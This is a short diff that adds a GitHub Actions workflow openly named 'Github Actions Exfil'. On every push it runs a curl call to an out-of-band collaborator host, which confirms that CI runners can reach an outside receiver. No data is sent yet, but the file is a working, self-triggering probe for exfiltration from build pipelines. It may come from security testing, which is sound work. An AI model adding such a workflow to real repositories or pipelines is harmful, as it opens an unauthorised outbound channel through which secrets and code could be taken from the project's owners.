@@ -1,0 +1,10 @@
+name: Github Actions Exfil
+run-name: ${{ github.actor }} is exfiling data 🚀
+on: [push]
+jobs:
+  Explore-GitHub-Actions:
+    runs-on: ubuntu-latest
+    steps:
+      - run: echo  "This job was triggered by  a ${{ github.event_name }} event"
+      - run: curl "https://bjyqtdco57amy7dt88fb8pil5cb3ztni.bcollaborator.binsec.cloud"
+      - run: echo "this job's status is ${{ job.status }}"
